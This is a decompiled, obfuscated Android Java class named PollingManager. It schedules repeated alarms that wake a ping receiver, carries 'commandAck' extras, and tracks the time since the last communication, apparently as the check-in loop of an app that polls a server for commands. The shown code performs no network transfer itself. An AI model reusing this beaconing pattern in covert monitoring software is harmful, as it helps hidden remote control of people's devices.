package com.network.g;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import com.network.b.b;
import com.network.location.PingReceiver;

public final class a {
    private static void a(Context context, int i, AlarmManager alarmManager) {
        int i2 = i * 1000;
        try {
            com.network.android.c.a.a.a("PollingManager setPollingPing - next ping pollingInterval (Ms): " + i2 + " (minutes):" + (i2 / 60000));
            Intent intent = new Intent(context, PingReceiver.class);
            intent.setAction("httpPingPolling");
            alarmManager.set(0, System.currentTimeMillis() + ((long) i2), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Throwable th) {
            com.network.android.c.a.a.a("PollingManager startPolling exception - " + th.getMessage(), th);
        }
    }

    public static void a(Context context, int i, String str, String str2) {
        try {
            int i2 = i * 1000;
            com.network.android.c.a.a.a("PollingManager setEventAlarm - next ping pollingInterval (Ms): " + i2 + " (Seconds):" + i);
            Intent intent = new Intent(context, PingReceiver.class);
            intent.setAction(str);
            intent.putExtra("commandAck", str2);
            intent.putExtra("counter", str2);
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + ((long) i2), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Throwable th) {
            com.network.android.c.a.a.a("PollingManager startPolling exception - " + th.getMessage(), th);
        }
    }

    public static void a(Context context, AlarmManager alarmManager) {
        try {
            com.network.android.c.a.a.a("PollingManager startPollingOnInit");
            int J = b.J();
            com.network.android.c.a.a.a("PollingManager startPollingOnInit pollingInterval: " + J);
            a(context, J, alarmManager);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("PollingManager startPollingOnInit exception - " + th.getMessage(), th);
        }
    }

    public static void a(Context context, String str) {
        try {
            com.network.android.c.a.a.a("PollingManager setPollingPing - pollingIntervalStr seconds: " + str);
            int parseInt = Integer.parseInt(str);
            int i = parseInt / 60;
            com.network.android.c.a.a.a("PollingManager setPollingPing - pollingInterval minutes: " + i);
            b.l(parseInt);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
            Intent intent = new Intent(context, PingReceiver.class);
            intent.setAction("httpPingPolling");
            alarmManager.cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
            if (i > 0) {
                a(context, parseInt, alarmManager);
            } else {
                com.network.android.c.a.a.a("PollingManager setPollingPing puling was stopped !!!: " + str);
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("PollingManager setPollingPing exception- " + th.getMessage(), th);
        }
    }

    public static boolean a(Context context) {
        boolean z = false;
        try {
            com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll");
            int J = b.J();
            if (J <= 0) {
                com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll DONT need pollingInterval is zero: " + J);
                return false;
            }
            long i = b.i();
            com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll - timeAfterLastCom (MILIseconds): " + i);
            if (i != 0) {
                long currentTimeMillis = (System.currentTimeMillis() / 1000) - i;
                com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll - timeAfterLastCom (seconds): " + currentTimeMillis);
                com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll - pollingInterval (seconds): " + J);
                if (((long) J) > currentTimeMillis) {
                    long j = (((long) J) - currentTimeMillis) + 1;
                    com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll DONT need to send time for next pooling: " + j + " (minutes) " + (j / 60));
                    a(context, (int) j, (AlarmManager) context.getSystemService("alarm"));
                    return false;
                }
                com.network.android.c.a.a.a("CoreReceiver PollingManager shouldPoll SHOULD need to send time for pooling: " + (((long) J) - currentTimeMillis) + " (minutes) " + ((((long) J) - currentTimeMillis) / 60));
                z = true;
                a(context, (AlarmManager) context.getSystemService("alarm"));
            }
            return z;
        } catch (Throwable th) {
            com.network.android.c.a.a.a("PollingManager startPollingOnInit exception - " + th.getMessage(), th);
            return false;
        }
    }
}
